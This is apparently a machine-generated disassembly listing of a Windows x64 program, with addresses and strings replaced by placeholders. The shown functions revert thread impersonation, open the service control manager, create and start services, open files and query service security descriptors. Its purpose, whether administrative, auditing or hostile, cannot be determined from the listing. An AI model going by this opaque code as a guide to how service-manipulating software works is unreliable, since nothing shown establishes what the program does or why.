mov [ rbp + 0x27 ] rdi
mov [ rbp + 0x17 ] di
cmp [ rbp + 0x7 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x17 ]
call j_sub_14003ad04
mov rax rbx
mov rcx [ rbp + 0x47 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xb0 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x11 ]
call j_sub_14003ad04
sub_14002bd40
push rdi
sub rsp 0x60
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x70 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x50 ] rax
lea rdx [ r--data ]
lea rdi [ rw-data ]
mov rcx rdi
call sub_14000ac10
call [ RevertToSelf@IAT ]
test eax eax
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x28 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
mov rcx rdi
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
nop
cmp [ rsp + 0x40 ] 0x8
jb r-xdata
lea rdx [ r--data ]
mov rcx rdi
call sub_14000ac10
jmp r-xdata
mov edx 0xa
mov rcx rdi
call sub_1400085e0
xor ebx ebx
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + rdi + 0x10 ] 0x6
jne r-xdata
mov rcx [ rsp + 0x28 ]
call j_sub_14003ad04
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
mov rcx [ rcx + rdi + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
mov ecx 0x4
cmp eax 0xffffffff
cmove ebx ecx
mov rax [ rw-data ]
mov al 0x1
mov rcx [ rsp + 0x50 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x70 ]
add rsp 0x60
pop rdi
retn
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
sub_14002be50
mov rax rsp
push rbp
lea rbp [ rax - 0x138 ]
sub rsp 0x230
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x120 ] rax
mov rbx rcx
mov [ rsp + 0x30 ] rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rsp + 0x20 ] 0x1
lea rax [ sub_14002c780 ]
mov [ rbp ] rax
mov esi 0x7
mov [ rbp + 0x20 ] rsi
mov [ rbp + 0x8 ] di
mov rcx [ r--data ]
mov [ rbp + 0x8 ] rcx
mov [ rbp + 0x18 ] 0x4
lea rax [ rbp + 0x8 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0x8 ] di
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x1d ]
lea rcx [ rbp + 0x30 ]
call sub_1400025a0
lea r11 [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae r11 [ rbp + 0x30 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov rax [ r--data ]
mov [ r11 + 0x28 ] rax
mov rax [ r--data ]
mov [ r11 + 0x30 ] rax
movzx eax [ r--data ]
mov [ r11 + 0x38 ] ax
mov [ rbp + 0x40 ] 0x1d
lea rax [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rax [ rbp + 0x30 ]
mov [ rax + 0x3a ] di
lea rdx [ rbp ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14002c3b0 ]
mov [ rsp + 0x40 ] r11
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x48 ] di
mov rcx [ r--data ]
mov [ rsp + 0x48 ] rcx
movzx eax [ r--data ]
mov [ rsp + 0x50 ] ax
mov [ rsp + 0x58 ] 0x5
lea rax [ rsp + 0x48 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xa ] di
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
xor r8d r8d
lea edx [ rdi + 0x1c ]
lea rcx [ rsp + 0x70 ]
call sub_1400025a0
lea r11 [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae r11 [ rsp + 0x70 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov rax [ r--data ]
mov [ r11 + 0x28 ] rax
mov rax [ r--data ]
mov [ r11 + 0x30 ] rax
mov [ rbp - 0x80 ] 0x1c
lea rax [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rax [ rsp + 0x70 ]
mov [ rax + 0x38 ] di
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14002c4f0 ]
mov [ rbp - 0x60 ] r11
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x58 ] di
mov rcx [ r--data ]
mov [ rbp - 0x58 ] rcx
mov [ rbp - 0x48 ] 0x4
lea rax [ rbp - 0x58 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0x8 ] di
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x1b ]
lea rcx [ rbp - 0x30 ]
call sub_1400025a0
lea r11 [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae r11 [ rbp - 0x30 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov rax [ r--data ]
mov [ r11 + 0x28 ] rax
mov eax [ r--data ]
mov [ r11 + 0x30 ] eax
movzx eax [ r--data ]
mov [ r11 + 0x34 ] ax
mov [ rbp - 0x20 ] 0x1b
lea rax [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rax [ rbp - 0x30 ]
mov [ rax + 0x36 ] di
lea rdx [ rbp - 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14002c640 ]
mov [ rbp + 0xc0 ] r11
mov [ rbp + 0xe0 ] rsi
mov [ rbp + 0xd8 ] rdi
mov [ rbp + 0xc8 ] di
lea r8d [ rdi + 0x6 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xc8 ]
call sub_140001ea0
nop
mov [ rbp + 0x108 ] rsi
mov [ rbp + 0x100 ] rdi
mov [ rbp + 0xf0 ] di
lea r8d [ rdi + 0x1d ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xf0 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0xc0 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14002cae0 ]
mov [ rbp + 0x60 ] r11
mov [ rbp + 0x80 ] rsi
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
lea r8d [ rdi + 0x8 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x68 ]
call sub_140001ea0
nop
mov [ rbp + 0xa8 ] rsi
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
lea r8d [ rdi + 0x8 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x90 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x60 ]
mov rcx rbx
call sub_140018d50
nop
cmp [ rbp + 0xa8 ] 0x8
jb r-xdata
mov [ rbp + 0xa8 ] rsi
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x90 ]
call j_sub_14003ad04
mov [ rbp + 0x80 ] rsi
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
cmp [ rbp + 0x108 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_14003ad04
mov [ rbp + 0x108 ] rsi
mov [ rbp + 0x100 ] rdi
mov [ rbp + 0xf0 ] di
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xf0 ]
call j_sub_14003ad04
mov [ rbp + 0xe0 ] rsi
mov [ rbp + 0xd8 ] rdi
mov [ rbp + 0xc8 ] di
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xc8 ]
call j_sub_14003ad04
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] di
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_14003ad04
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_14003ad04
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x30 ]
call j_sub_14003ad04
mov rax rbx
mov rcx [ rbp + 0x120 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x230 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x8 ]
call j_sub_14003ad04
sub_14002c3b0
push rdi
sub rsp 0x60
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov [ rsp + 0x80 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x50 ] rax
mov rdi rcx
mov rbx [ rcx ]
lea rdx [ r--data ]
lea rsi [ rw-data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx [ rdi ]
call sub_14000ec80
test al al
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x28 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
nop
cmp [ rsp + 0x40 ] 0x8
jb r-xdata
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
jmp r-xdata
mov edx 0xa
mov rcx rsi
call sub_1400085e0
xor ebx ebx
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
mov rcx [ rsp + 0x28 ]
call j_sub_14003ad04
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test ebx ebx
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
mov ecx 0x4
cmp eax 0xffffffff
cmove ebx ecx
mov rax [ rw-data ]
mov al 0x1
mov rcx [ rsp + 0x50 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x78 ]
mov rsi [ rsp + 0x80 ]
add rsp 0x60
pop rdi
retn
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
sub_14002c4f0
push rdi
sub rsp 0x60
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov [ rsp + 0x80 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x50 ] rax
mov rdi rcx
mov rbx [ rcx ]
lea rdx [ r--data ]
lea rsi [ rw-data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
lea rdx [ rsp + 0x28 ]
mov rcx [ rdi ]
call sub_14000ee00
test al al
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x28 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
nop
cmp [ rsp + 0x40 ] 0x8
jb r-xdata
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
jmp r-xdata
mov edx 0xa
mov rcx rsi
call sub_1400085e0
xor ebx ebx
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
mov rcx [ rsp + 0x28 ]
call j_sub_14003ad04
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test ebx ebx
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
mov ecx 0x4
cmp eax 0xffffffff
cmove ebx ecx
mov rax [ rw-data ]
mov al 0x1
mov rcx [ rsp + 0x50 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x78 ]
mov rsi [ rsp + 0x80 ]
add rsp 0x60
pop rdi
retn
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
sub_14002c640
push rdi
sub rsp 0x60
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov [ rsp + 0x80 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x50 ] rax
mov rdi rcx
mov rbx [ rcx ]
lea rdx [ r--data ]
lea rsi [ rw-data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx [ rdi ]
call sub_14000ed40
test al al
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x28 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
nop
cmp [ rsp + 0x40 ] 0x8
jb r-xdata
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
jmp r-xdata
mov edx 0xa
mov rcx rsi
call sub_1400085e0
xor ebx ebx
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
mov rcx [ rsp + 0x28 ]
call j_sub_14003ad04
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test ebx ebx
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
mov ecx 0x4
cmp eax 0xffffffff
cmove ebx ecx
mov rax [ rw-data ]
mov al 0x1
mov rcx [ rsp + 0x50 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x78 ]
mov rsi [ rsp + 0x80 ]
add rsp 0x60
pop rdi
retn
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
sub_14002c780
mov rax rsp
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x70
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov rbx rcx
mov edi 0x20
mov ecx edi
call sub_14003ac60
mov rbp rax
xor r13d r13d
test rax rax
je r-xdata
mov rbp r13
mov [ rax ] r13
mov [ rax + 0x8 ] r13
mov [ rax + 0x10 ] r13
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x38 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
mov rbx [ rbp ]
cmp rbx [ rbp + 0x8 ]
je r-xdata
mov rdx [ rbx ]
cmp rdx [ rbx + 0x8 ]
cmove rdx r13
mov rcx rbp
call sub_14000e8b0
test al al
je r-xdata
test rbp rbp
je r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_14003ad04
lea rsi [ rw-data ]
mov r14d 0x9
lea r15 [ __dos_header ]
nop [ rax + rax ] eax
mov al 0x1
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rcx [ rbp ]
test rcx rcx
je r-xdata
mov edx r14d
mov rcx rsi
call sub_14000fe50
test [ rbx + 0x50 ] 0x100
je r-xdata
mov edx 0x5
lea rcx [ rsp + 0x28 ]
call sub_140039e70
mov rcx [ rw-data ]
movsxd rcx [ rcx + 0x4 ]
add rcx rsi
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rw-data ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rsi + 0x58 ] di
mov edx [ rbx + 0x6c ]
mov rcx rsi
call sub_140008400
mov [ rbp ] r13
mov [ rbp + 0x8 ] r13
mov [ rbp + 0x10 ] r13
mov rcx rbp
call j_sub_14003ad04
mov rdx [ rbp + 0x8 ]
call sub_14000f1a0
mov rcx [ rbp ]
call j_sub_14003ad04
test [ rbx + 0x50 ] 0x2
je r-xdata
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
movzx edx r14w
call sub_14000fe50
test [ rbx + 0x50 ] 0x1
je r-xdata
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
movzx edx r14w
call sub_14000fe50
test [ rbx + 0x50 ] 0x10
je r-xdata
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
movzx edx r14w
call sub_14000fe50
test [ rbx + 0x50 ] 0x20
je r-xdata
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
movzx edx r14w
call sub_14000fe50
mov eax [ rbx + 0x54 ]
dec eax
cmp eax 0x6
ja r-xdata
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
movzx edx r14w
call sub_14000fe50
mov edx r14d
mov rcx rsi
call sub_14000fe50
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
movzx edx r14w
call sub_14000fe50
mov rcx rax
lea rdx [ rbx + 0x28 ]
call sub_14000ae70
mov r12 rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov edi r13d
mov rcx [ r12 ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + r12 + 0x10 ] 0x6
jne r-xdata
mov ecx [ r15 + rax * 4 + 0x2cac4 ]
add rcx r15
jmp rcx
mov rax [ r12 ]
movsxd rcx [ rax + 0x4 ]
add rcx r12
test edi edi
je r-xdata
mov rcx [ rcx + r12 + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
mov eax 0x4
cmove edi eax
lea rdx [ r--data ]
jmp r-xdata
lea rdx [ r--data ]
jmp r-xdata
lea rdx [ r--data ]
jmp r-xdata
lea rdx [ r--data ]
jmp r-xdata
lea rdx [ r--data ]
jmp r-xdata
lea rdx [ r--data ]
jmp r-xdata
lea rdx [ r--data ]
add rbx 0x78
cmp rbx [ rbp + 0x8 ]
mov edi 0x20
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rcx rsi
call sub_14000ac10
cmp [ rbx + 0x6c ] 0x0
je r-xdata
jmp r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
sub_14002cae0
mov rax rsp
push rbp
push r13
push r14
lea rbp [ rax - 0x28 ]
sub rsp 0x110
mov [ rbp - 0x80 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
mov rax [ rw-data ]
xor rax rsp
mov [ rbp ] rax
mov r8d 0x3
lea rdx [ r--data ]
xor ecx ecx
call [ OpenSCManagerW@IAT ]
mov r13 rax
test rax rax
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x78 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp - 0x60 ] 0x8
jb r-xdata
mov r8d 0x10
lea rdx [ r--data ]
mov rcx rax
call [ OpenServiceW@IAT ]
mov r12 rax
xor esi esi
lea r14d [ rsi + 0x4 ]
test rax rax
jne r-xdata
mov al 0x1
mov rcx [ rbp ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x110 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov r12 [ r11 + 0x38 ]
mov rsp r11
pop r14
pop r13
pop rbp
retn
mov rcx [ rbp - 0x78 ]
call j_sub_14003ad04
lea rdx [ r--data ]
lea rdi [ rw-data ]
mov rcx rdi
call sub_14000ac10
mov rcx rax
call sub_140007970
call [ GetLastError@IAT ]
cmp eax 0x424
jne r-xdata
mov rcx r13
call [ CloseServiceHandle@IAT ]
jmp r-xdata
xor r8d r8d
xor edx edx
mov rcx r12
call [ StartServiceW@IAT ]
test eax eax
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x78 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp - 0x60 ] 0x8
jb r-xdata
lea rdx [ r--data ]
lea rdi [ rw-data ]
mov rcx rdi
call sub_14000ac10
mov rcx rax
call sub_140007970
mov [ rbp - 0x10 ] 0x7
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x28 ] si
xor r8d r8d
lea edx [ rsi + 0xc ]
lea rcx [ rbp - 0x28 ]
call sub_1400025a0
lea r11 [ rbp - 0x28 ]
cmp [ rbp - 0x10 ] 0x8
cmovae r11 [ rbp - 0x28 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov [ rbp - 0x18 ] 0xc
lea rax [ rbp - 0x28 ]
cmp [ rbp - 0x10 ] 0x8
cmovae rax [ rbp - 0x28 ]
mov [ rax + 0x18 ] si
mov [ rbp - 0x38 ] 0x7
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x50 ] si
lea rdx [ rbp - 0x50 ]
lea rcx [ rbp - 0x28 ]
call sub_14000f780
test al al
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x78 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
mov rcx rdi
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
nop
cmp [ rbp - 0x60 ] 0x8
jb r-xdata
lea rdx [ r--data ]
mov rcx rdi
call sub_14000ac10
jmp r-xdata
mov rcx [ rbp - 0x78 ]
call j_sub_14003ad04
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x78 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
mov rcx rdi
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
lea rcx [ rbp - 0x50 ]
cmp [ rbp - 0x38 ] 0x8
cmovae rcx [ rbp - 0x50 ]
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] 0x3
xor r9d r9d
xor edx edx
lea r8d [ r12 + 0x1 ]
call [ CreateFileW@IAT ]
test rax rax
je r-xdata
mov edx 0xa
mov rcx rdi
call sub_1400085e0
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + rdi + 0x10 ] 0x6
jne r-xdata
mov rcx [ rbp - 0x78 ]
call j_sub_14003ad04
cmp [ rbp - 0x38 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x78 ]
call j_sub_14003ad04
nop
call [ GetLastError@IAT ]
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x78 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
mov rcx rdi
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
jmp r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test esi esi
je r-xdata
mov rcx [ rcx + rdi + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove esi r14d
mov rax [ rw-data ]
mov [ rbp - 0x38 ] 0x7
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x50 ] si
cmp [ rbp - 0x10 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x50 ]
call j_sub_14003ad04
cmp [ rbp - 0x60 ] 0x8
jb r-xdata
mov rcx rax
call [ CloseHandle@IAT ]
lea r11 [ rbp - 0x50 ]
cmp [ rbp - 0x38 ] 0x8
cmovae r11 [ rbp - 0x50 ]
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x38 ] r11
mov [ rsp + 0x30 ] 0x1
mov [ rsp + 0x28 ] 0x2
mov [ rsp + 0x20 ] 0x1
mov r9d 0x60010
lea r8 [ r--data ]
lea rdx [ r--data ]
mov rcx r13
call [ CreateServiceW@IAT ]
mov r12 rax
mov [ rsp + 0x78 ] rax
test rax rax
je r-xdata
mov rcx r12
call [ CloseServiceHandle@IAT ]
mov edx [ rcx + 0x10 ]
or edx esi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
test r12 r12
je r-xdata
mov rcx [ rbp - 0x28 ]
call j_sub_14003ad04
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x78 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
mov rcx rdi
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
jmp r-xdata
lea rdx [ r--data ]
mov rcx rdi
call sub_14000ac10
mov rcx rax
call sub_140007970
mov [ rsp + 0x74 ] esi
lea rax [ rsp + 0x74 ]
mov [ rsp + 0x20 ] rax
xor r9d r9d
lea r8 [ rbp - 0x78 ]
mov edx r14d
mov rcx r12
call [ QueryServiceObjectSecurity@IAT ]
test eax eax
jne r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x78 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
mov rcx rdi
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
nop
cmp [ rbp - 0x60 ] 0x8
jb r-xdata
lea rdx [ rsp + 0x74 ]
lea rcx [ rsp + 0x78 ]
call sub_14000e570
test al al
je r-xdata
mov edx 0xa
mov rcx rdi
call sub_1400085e0
mov ebx esi
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + rdi + 0x10 ] 0x6
jne r-xdata
mov rcx [ rbp - 0x78 ]
call j_sub_14003ad04
mov r12 [ rsp + 0x78 ]
lea rdx [ r--data ]
mov rcx rdi
call sub_14000ac10
mov r12 [ rsp + 0x78 ]
jmp r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
mov rcx [ rcx + rdi + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove ebx r14d
mov rax [ rw-data ]
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
call sub_140003120
jmp r-xdata
or edx 0x4
sub_14002d090
mov rax rsp
push rbp
lea rbp [ rax - 0x198 ]
sub rsp 0x290
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
